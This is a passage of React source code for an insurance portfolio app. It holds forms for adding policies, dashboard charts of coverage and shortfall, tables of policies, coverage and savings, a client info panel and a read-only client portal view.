// ADD POLICY FORM
// ============================================================
function AddPolicyForm({ client, clients, saveClients, onClose, updateClient }) {
  const [p, setP] = useState({
    type: "Whole Life Limited", insurer: "NTUC Income", planName: "",
    policyNumber: "", insured: "Self",
    deathCoverage: 0, tpdCoverage: 0, ciCoverage: 0, earlyCI: 0,
    frequency: "Annually", paymentMode: "Paynow",
    premiumAmount: 0, annualPremium: 0,
    startDate: "", premiumTerm: 0, maturityDate: "", cashValue: 0, remarks: "", status: "Active"
  });

  const policyTypes = ["Whole Life Limited","Whole Life","Term Life","Critical Illness",
    "Early Critical Illness","Integrated Plan","Integrated Plan Rider","Long Term Care",
    "Home Insurance","Travel Insurance (Annual)","Education","Personal Accident","Others"];

  function save() {
    const newPol = {
      id: Date.now(),
      type: p.type, insurer: p.insurer, planName: p.planName,
      policyNumber: p.policyNumber, insured: p.insured,
      coverage: { death: +p.deathCoverage, tpd: +p.tpdCoverage, ci: +p.ciCoverage, earlyCI: +p.earlyCI },
      premium: { frequency: p.frequency, paymentMode: p.paymentMode, amount: +p.premiumAmount, annual: +p.annualPremium },
      startDate: p.startDate, premiumTerm: +p.premiumTerm, maturityDate: p.maturityDate,
      cashValue: +p.cashValue, remarks: p.remarks, status: p.status, claimed: 0,
    };
    const updated = { ...client, policies: [...client.policies, newPol] };
    updateClient(updated);
    onClose();
  }

  return (
    <div style={{
      background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.12)",
      borderRadius: 12, padding: 24, marginBottom: 24
    }}>
      <h3 style={{ margin: "0 0 20px", fontSize: 16 }}>Add New Policy</h3>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 14 }}>
        {[
          ["Policy Type", "type", "select", policyTypes],
          ["Insurer", "insurer", "text"],
          ["Plan Name", "planName", "text"],
          ["Policy Number", "policyNumber", "text"],
          ["Insured", "insured", "select", ["Self","Spouse","Elder Kid","Younger Kid","Youngest Kid"]],
          ["Status", "status", "select", ["Active","Lapsed","Matured","Terminated","Claimed"]],
          ["Death Coverage ($)", "deathCoverage", "number"],
          ["TPD Coverage ($)", "tpdCoverage", "number"],
          ["CI Coverage ($)", "ciCoverage", "number"],
          ["Early CI Coverage ($)", "earlyCI", "number"],
          ["Premium Frequency", "frequency", "select", ["Monthly","Quarterly","Half Yearly","Annually","Lump Sum"]],
          ["Payment Mode", "paymentMode", "select", ["Cash","GIRO","CPF","Paynow","Credit Card","Cheque","Others"]],
          ["Premium Amount ($)", "premiumAmount", "number"],
          ["Annual Premium ($)", "annualPremium", "number"],
          ["Start Date", "startDate", "date"],
          ["Premium Term (yrs)", "premiumTerm", "number"],
          ["Maturity Date", "maturityDate", "date"],
          ["Cash Value ($)", "cashValue", "number"],
          ["Remarks", "remarks", "text"],
        ].map(([label, key, type, opts]) => (
          <div key={key} style={key === "remarks" ? { gridColumn: "span 3" } : {}}>
            <label style={{ color: "#94a3b8", fontSize: 11, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</label>
            {type === "select" ? (
              <select value={p[key]} onChange={e => setP(x => ({ ...x, [key]: e.target.value }))}
                style={{ ...inputStyle, marginTop: 4 }}>
                {opts.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
            ) : (
              <input type={type} value={p[key]}
                onChange={e => setP(x => ({ ...x, [key]: e.target.value }))}
                style={{ ...inputStyle, marginTop: 4 }} />
            )}
          </div>
        ))}
      </div>
      <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
        <button onClick={save} style={{
          padding: "8px 20px", borderRadius: 8, background: "#059669",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer"
        }}>Save Policy</button>
        <button onClick={onClose} style={{
          padding: "8px 20px", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)",
          background: "transparent", color: "#94a3b8", cursor: "pointer"
        }}>Cancel</button>
      </div>
    </div>
  );
}

// ============================================================
// DASHBOARD TAB (mirrors PDF overview)
// ============================================================
function DashboardTab({ client }) {
  const cb = client.coverageBreakdown || {};
  const barData = [
    { name: "Life & TI", ideal: cb.lifeTI?.ideal || 0, current: cb.lifeTI?.current || 0, shortfall: cb.lifeTI?.shortfall || 0 },
    { name: "TPD", ideal: cb.tpd?.ideal || 0, current: cb.tpd?.current || 0, shortfall: cb.tpd?.shortfall || 0 },
    { name: "Critical Illness", ideal: cb.criticalIllness?.ideal || 0, current: cb.criticalIllness?.current || 0, shortfall: cb.criticalIllness?.shortfall || 0 },
    { name: "Early CI", ideal: cb.earlyIllness?.ideal || 0, current: cb.earlyIllness?.current || 0, shortfall: cb.earlyIllness?.shortfall || 0 },
  ];

  const lifeTotal = (cb.lifeTI?.current || 0) + (cb.tpd?.current || 0) + (cb.criticalIllness?.current || 0) + (cb.earlyIllness?.current || 0);
  const pieData = [
    { name: "Life & TI", value: cb.lifeTI?.current || 0 },
    { name: "TPD", value: cb.tpd?.current || 0 },
    { name: "Critical Illness", value: cb.criticalIllness?.current || 0 },
    { name: "Early CI", value: cb.earlyIllness?.current || 0 },
  ].filter(d => d.value > 0);

  const totalPolicies = client.policies.length;
  const totalPremium = client.policies.reduce((s, p) => s + (p.premium?.annual || 0), 0);

  return (
    <div>
      {/* KPI Row */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 24 }}>
        {[
          ["Active Policies", totalPolicies, "📋", "#2563eb"],
          ["Annual Premium", fmt(totalPremium), "💰", "#059669"],
          ["Total Coverage", fmt(lifeTotal), "🛡️", "#7c3aed"],
          ["Endowment Value", fmt(cb.endowment?.current), "📈", "#d97706"],
        ].map(([label, val, icon, color]) => (
          <div key={label} style={{
            background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
            borderRadius: 12, padding: "18px 22px"
          }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
              <div>
                <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</div>
                <div style={{ fontSize: 22, fontWeight: 800, color, marginTop: 6 }}>{val}</div>
              </div>
              <div style={{ fontSize: 20 }}>{icon}</div>
            </div>
          </div>
        ))}
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 20, marginBottom: 20 }}>
        {/* Coverage Bar Chart */}
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Coverage & Shortfall</h3>
          <ResponsiveContainer width="100%" height={240}>
            <BarChart data={barData}>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
              <XAxis dataKey="name" tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <YAxis tickFormatter={v => "$" + (v / 1000) + "k"} tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              <Legend />
              <Bar dataKey="ideal" name="Ideal" fill="#2563eb" radius={[4, 4, 0, 0]} />
              <Bar dataKey="current" name="Current" fill="#059669" radius={[4, 4, 0, 0]} />
              <Bar dataKey="shortfall" name="Shortfall" fill="#ef4444" radius={[4, 4, 0, 0]} />
            </BarChart>
          </ResponsiveContainer>
        </div>

        {/* Pie Chart */}
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Current Coverage Mix</h3>
          {pieData.length > 0 ? (
            <ResponsiveContainer width="100%" height={240}>
              <PieChart>
                <Pie data={pieData} cx="50%" cy="50%" innerRadius={50} outerRadius={90}
                  dataKey="value" label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                  labelLine={false}>
                  {pieData.map((_, i) => <Cell key={i} fill={PIE_COLORS[i % PIE_COLORS.length]} />)}
                </Pie>
                <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              </PieChart>
            </ResponsiveContainer>
          ) : (
            <div style={{ color: "#94a3b8", textAlign: "center", marginTop: 60 }}>No coverage data yet</div>
          )}
        </div>
      </div>

      {/* Coverage Breakdown Table */}
      <div style={{ display: "grid", gridTemplateColumns: "1.4fr 1fr", gap: 20 }}>
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Coverage Breakdown</h3>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["Coverage", "Current", "Ideal", "Savings Needed", "Shortfall"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.5, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ["Life & Term/TI", "lifeTI"],
                ["TPD", "tpd"],
                ["Critical Illness", "criticalIllness"],
                ["Early Illness", "earlyIllness"],
                ["Endowment", "endowment"],
              ].map(([label, key]) => {
                const row = cb[key] || {};
                return (
                  <tr key={key}>
                    <td style={{ padding: "10px 10px", fontSize: 13, fontWeight: 600 }}>{label}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13, color: "#60a5fa" }}>{fmt(row.current)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13 }}>{fmt(row.ideal)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13 }}>{fmt(row.savingsNeeded)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13, color: "#f87171", fontWeight: 700 }}>{fmt(row.shortfall)}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        <div style={{ display: "grid", gap: 16 }}>
          {/* Medical H&S */}
          <StatusCard title="Medical H&S" items={[
            ["Medishield Life", client.medicalHS?.medishieldLife],
            ["Integrated Plan", client.medicalHS?.integratedPlan],
            ["Rider (add-on)", client.medicalHS?.rider],
          ]} />
          {/* Severe Disability */}
          <StatusCard title="Severe Disability" items={[
            ["CareShield Life", client.severeDisability?.careShieldLife],
            ["ElderShield", client.severeDisability?.elderShield],
            ["LongTerm Care", client.severeDisability?.longTermCare],
          ]} />
          {/* Housing */}
          <StatusCard title="Housing / Dependant" items={[
            ["Dependant Protection Scheme", client.housingDependant?.dependantProtectionScheme],
            ["Home Protection Scheme", client.housingDependant?.homeProtectionScheme],
          ]} />
        </div>
      </div>
    </div>
  );
}

function StatusCard({ title, items }) {
  return (
    <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 18 }}>
      <div style={{ fontSize: 13, fontWeight: 700, color: "#e2e8f0", marginBottom: 10 }}>{title}</div>
      {items.map(([label, val]) => (
        <div key={label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "5px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
          <span style={{ fontSize: 12, color: "#94a3b8" }}>{label}</span>
          <span style={{
            fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 4,
            background: val === "Yes" ? "rgba(5,150,105,0.2)" : "rgba(100,116,139,0.2)",
            color: val === "Yes" ? "#34d399" : "#94a3b8"
          }}>{val || "—"}</span>
        </div>
      ))}
    </div>
  );
}

// ============================================================
// POLICIES TAB
// ============================================================
function PoliciesTab({ client, clients, saveClients, updateClient }) {
  function deletePolicy(id) {
    const updated = { ...client, policies: client.policies.filter(p => p.id !== id) };
    updateClient(updated);
  }

  const lifePolices = client.policies.filter(p => ["Whole Life Limited","Whole Life","Term Life","Personal Accident","Critical Illness","Early Critical Illness"].includes(p.type));
  const healthPolicies = client.policies.filter(p => ["Integrated Plan","Integrated Plan Rider","Long Term Care"].includes(p.type));
  const generalPolicies = client.policies.filter(p => ["Home Insurance","Travel Insurance (Annual)"].includes(p.type));
  const savingsPolicies = client.policies.filter(p => ["Education","Endowment","Retirement"].includes(p.type));

  return (
    <div style={{ display: "grid", gap: 24 }}>
      {[
        ["Life Insurance Policies", lifePolices],
        ["Health & Disability Insurance", healthPolicies],
        ["General Insurance", generalPolicies],
        ["Savings & Wealth Accumulation", savingsPolicies],
      ].map(([sectionTitle, polList]) => polList.length === 0 ? null : (
        <div key={sectionTitle} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>{sectionTitle}</h3>
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
              <thead>
                <tr>
                  {["#","Type","Insurer","Plan","Policy No","Insured","Death","TPD","CI","Early CI","Premium","Annual","Start","Term","Status","Action"].map(h => (
                    <th key={h} style={{ textAlign: "left", padding: "8px 8px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)", whiteSpace: "nowrap" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {polList.map((pol, i) => (
                  <tr key={pol.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <td style={{ padding: "10px 8px", color: "#94a3b8" }}>{i + 1}</td>
                    <td style={{ padding: "10px 8px", fontWeight: 600 }}>{pol.type}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.insurer}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.planName}</td>
                    <td style={{ padding: "10px 8px", color: "#60a5fa" }}>{pol.policyNumber}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.insured}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.death ? fmt(pol.coverage.death) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.tpd ? fmt(pol.coverage.tpd) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.ci ? fmt(pol.coverage.ci) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.earlyCI ? fmt(pol.coverage.earlyCI) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{fmt(pol.premium?.amount)}</td>
                    <td style={{ padding: "10px 8px", color: "#34d399" }}>{fmt(pol.premium?.annual)}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.startDate || "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.premiumTerm ? pol.premiumTerm + "y" : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>
                      <span style={{
                        padding: "2px 6px", borderRadius: 4, fontSize: 10, fontWeight: 700,
                        background: pol.status === "Active" ? "rgba(5,150,105,0.2)" : "rgba(239,68,68,0.2)",
                        color: pol.status === "Active" ? "#34d399" : "#f87171"
                      }}>{pol.status}</span>
                    </td>
                    <td style={{ padding: "10px 8px" }}>
                      <button onClick={() => deletePolicy(pol.id)} style={{
                        background: "rgba(239,68,68,0.2)", border: "none", color: "#f87171",
                        borderRadius: 4, padding: "2px 8px", cursor: "pointer", fontSize: 11
                      }}>✕</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      ))}
    </div>
  );
}

// ============================================================
// COVERAGE TAB — detailed calculation
// ============================================================
function CoverageTab({ client }) {
  const cc = client.coverageCalculation || {};
  const rc = client.retirementCalculation || {};

  return (
    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
      <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Coverage Calculation</h3>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
          <thead>
            <tr>
              <th style={{ textAlign: "left", padding: "6px 8px", color: "#94a3b8", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>Parameter</th>
              <th style={{ textAlign: "right", padding: "6px 8px", color: "#60a5fa", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>LIFE</th>
              <th style={{ textAlign: "right", padding: "6px 8px", color: "#db2777", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>CRITICAL</th>
            </tr>
          </thead>
          <tbody>
            {[
              ["Monthly Needs", cc.life?.monthlyNeeds, cc.critical?.monthlyNeeds, true],
              ["Annual Amount", cc.life?.annualAmount, cc.critical?.annualAmount, true],
              ["Years Required", cc.life?.yearsRequired, cc.critical?.yearsRequired, false],
              ["Inflation (2-5%)", cc.life?.inflation ? (cc.life.inflation * 100).toFixed(1) + "%" : "—", cc.critical?.inflation ? (cc.critical.inflation * 100).toFixed(1) + "%" : "—", false],
            ].map(([label, lifeV, critV, isMoney]) => (
              <tr key={label}>
                <td style={{ padding: "10px 8px", color: "#94a3b8" }}>{label}</td>
                <td style={{ padding: "10px 8px", textAlign: "right", fontWeight: 600, color: "#60a5fa" }}>{isMoney ? fmt(lifeV) : lifeV}</td>
                <td style={{ padding: "10px 8px", textAlign: "right", fontWeight: 600, color: "#db2777" }}>{isMoney ? fmt(critV) : critV}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Retirement Calculation</h3>
        {[
          ["Monthly Requirement", fmt(rc.monthlyRequirement)],
          ["Annual", fmt(rc.annual)],
          ["Period from Age 65", rc.yearsFromAge65 + " years"],
          ["Inflation (2-5%)", rc.inflation ? (rc.inflation * 100).toFixed(1) + "%" : "—"],
          ["Amount Required", fmt(rc.amountRequired)],
        ].map(([label, val]) => (
          <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "10px 0", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
            <span style={{ color: "#94a3b8", fontSize: 13 }}>{label}</span>
            <span style={{ fontWeight: 700, fontSize: 13, color: label === "Amount Required" ? "#fbbf24" : "#f1f5f9" }}>{val}</span>
          </div>
        ))}
      </div>

      {/* Policy Detail Breakdown */}
      <div style={{ gridColumn: "span 2", background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Policies Details Breakdown</h3>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
          <thead>
            <tr>
              {["No", "Policy Number", "Plan Name", "Coverage Type", "Sum Assured", "Claimed", "Remaining SA", "Status", "Remarks"].map(h => (
                <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {client.policies.flatMap((pol, pidx) => {
              const rows = [];
              const covTypes = [
                ["Life/TI", pol.coverage?.death],
                ["TPD", pol.coverage?.tpd],
                ["Critical Illness", pol.coverage?.ci],
                ["Early Critical Illness", pol.coverage?.earlyCI],
              ].filter(([, v]) => v && v > 0);

              if (covTypes.length === 0) {
                rows.push(
                  <tr key={pol.id + "_0"} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{pidx + 1}</td>
                    <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{pol.policyNumber}</td>
                    <td style={{ padding: "8px 10px" }}>{pol.planName}</td>
                    <td style={{ padding: "8px 10px" }}>{pol.type}</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>
                      <span style={{ background: "rgba(5,150,105,0.2)", color: "#34d399", padding: "1px 6px", borderRadius: 4, fontSize: 10 }}>{pol.status}</span>
                    </td>
                    <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{pol.remarks || "—"}</td>
                  </tr>
                );
              } else {
                covTypes.forEach(([covType, amount], ci) => {
                  rows.push(
                    <tr key={pol.id + "_" + ci} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                      <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{ci === 0 ? pidx + 1 : ""}</td>
                      <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{ci === 0 ? pol.policyNumber : ""}</td>
                      <td style={{ padding: "8px 10px" }}>{ci === 0 ? pol.planName : ""}</td>
                      <td style={{ padding: "8px 10px" }}>{covType}</td>
                      <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{fmt(amount)}</td>
                      <td style={{ padding: "8px 10px" }}>{fmt(pol.claimed || 0)}</td>
                      <td style={{ padding: "8px 10px", color: "#34d399" }}>{fmt((amount || 0) - (pol.claimed || 0))}</td>
                      <td style={{ padding: "8px 10px" }}>
                        {ci === 0 && <span style={{ background: "rgba(5,150,105,0.2)", color: "#34d399", padding: "1px 6px", borderRadius: 4, fontSize: 10 }}>{pol.status}</span>}
                      </td>
                      <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{ci === 0 ? (pol.remarks || "—") : ""}</td>
                    </tr>
                  );
                });
              }
              return rows;
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ============================================================
// SAVINGS TAB
// ============================================================
function SavingsTab({ client }) {
  const savPolicies = client.policies.filter(p => ["Education","Endowment","Retirement"].includes(p.type));
  const totalInvested = savPolicies.reduce((s, p) => s + (p.currentInvested || 0), 0);
  const totalValue = savPolicies.reduce((s, p) => s + (p.currentValue || 0), 0);
  const totalPnL = totalValue - totalInvested;

  const er = client.expectedReturn || [];

  return (
    <div style={{ display: "grid", gap: 20 }}>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 16 }}>
        {[
          ["Total Invested", fmt(totalInvested), "#2563eb"],
          ["Current Value", fmt(totalValue), "#059669"],
          ["Profit / Loss", fmt(totalPnL), totalPnL >= 0 ? "#34d399" : "#f87171"],
        ].map(([l, v, c]) => (
          <div key={l} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: "20px 24px" }}>
            <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>{l}</div>
            <div style={{ fontSize: 24, fontWeight: 800, color: c, marginTop: 6 }}>{v}</div>
          </div>
        ))}
      </div>

      {savPolicies.length > 0 && (
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Savings Policies</h3>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
            <thead>
              <tr>
                {["Type","Insurer","Plan","Policy No","Start","Maturity","Invested","Value","P&L%","Remarks"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {savPolicies.map(p => (
                <tr key={p.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                  <td style={{ padding: "10px 10px" }}>{p.type}</td>
                  <td style={{ padding: "10px 10px" }}>{p.insurer}</td>
                  <td style={{ padding: "10px 10px" }}>{p.planName}</td>
                  <td style={{ padding: "10px 10px", color: "#60a5fa" }}>{p.policyNumber}</td>
                  <td style={{ padding: "10px 10px" }}>{p.startDate}</td>
                  <td style={{ padding: "10px 10px" }}>{p.maturityDate || "—"}</td>
                  <td style={{ padding: "10px 10px" }}>{fmt(p.currentInvested)}</td>
                  <td style={{ padding: "10px 10px", color: "#34d399" }}>{fmt(p.currentValue)}</td>
                  <td style={{ padding: "10px 10px", color: (p.profitPct || 0) >= 0 ? "#34d399" : "#f87171" }}>{p.profitPct ? p.profitPct.toFixed(2) + "%" : "—"}</td>
                  <td style={{ padding: "10px 10px", color: "#94a3b8" }}>{p.remarks || "—"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {er.length > 0 && (
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Expected Return Timeline</h3>
          <ResponsiveContainer width="100%" height={200}>
            <BarChart data={er}>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
              <XAxis dataKey="age" tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <YAxis tickFormatter={v => "$" + (v / 1000) + "k"} tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              <Bar dataKey="value" name="Expected Return" fill="#2563eb" radius={[4, 4, 0, 0]} />
            </BarChart>
          </ResponsiveContainer>
        </div>
      )}
    </div>
  );
}

// ============================================================
// INFO TAB
// ============================================================
function InfoTab({ client }) {
  const info = client.info || {};
  const fields = [
    ["Date of Birth", info.dob],
    ["Age", info.age],
    ["NRIC / Passport", info.nric],
    ["Citizenship", info.citizenship],
    ["Marital Status", info.maritalStatus],
    ["Gender", info.gender],
    ["Qualification", info.qualification || info.highestQualification],
    ["Annual Income", info.annualIncome],
    ["Smoker", info.smoker],
    ["Employment Status", info.employmentStatus],
    ["Risk Profile", info.riskProfile],
    ["Preferred Retirement Age", info.retirementAge],
    ["Home Owner", info.homeOwner],
    ["Car Owner", info.carOwner],
    ["Kids", info.kids],
  ];

  return (
    <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
      <h3 style={{ margin: "0 0 20px", fontSize: 15 }}>Client Information</h3>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 16 }}>
        {fields.map(([label, val]) => (
          <div key={label} style={{ padding: "12px 16px", background: "rgba(255,255,255,0.04)", borderRadius: 8 }}>
            <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8, marginBottom: 4 }}>{label}</div>
            <div style={{ fontSize: 14, fontWeight: 600 }}>{val != null ? String(val) : "—"}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ============================================================
// CLIENT VIEW (read-only portal)
// ============================================================
function ClientView({ client, tab, setTab, onLogout }) {
  const tabs = ["dashboard", "policies", "coverage", "savings"];
  return (
    <div style={{ minHeight: "100vh", background: "#0f172a", fontFamily: "'Segoe UI',sans-serif", color: "#f1f5f9" }}>
      <div style={{
        background: "rgba(255,255,255,0.04)", borderBottom: "1px solid rgba(255,255,255,0.1)",
        padding: "0 32px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 56
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <span style={{ fontWeight: 700, fontSize: 16 }}>My Insurance Portfolio</span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <span style={{ color: "#94a3b8", fontSize: 13 }}>Welcome, {client.name}</span>
          <button onClick={onLogout} style={{
            padding: "6px 14px", borderRadius: 6, border: "1px solid rgba(255,255,255,0.15)",
            background: "transparent", color: "#94a3b8", cursor: "pointer", fontSize: 13
          }}>Log Out</button>
        </div>
      </div>

      <div style={{ padding: "32px" }}>
        <div style={{ display: "flex", gap: 6, marginBottom: 28 }}>
          {tabs.map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: "8px 18px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
              background: tab === t ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400, textTransform: "capitalize"
            }}>{t}</button>
          ))}
        </div>

        {tab === "dashboard" && <DashboardTab client={client} />}
        {tab === "policies" && <PoliciesTab client={client} clients={[client]} saveClients={() => {}} updateClient={() => {}} />}
        {tab === "coverage" && <CoverageTab client={client} />}
        {tab === "savings" && <SavingsTab client={client} />}
      </div>
    </div>
  );
}
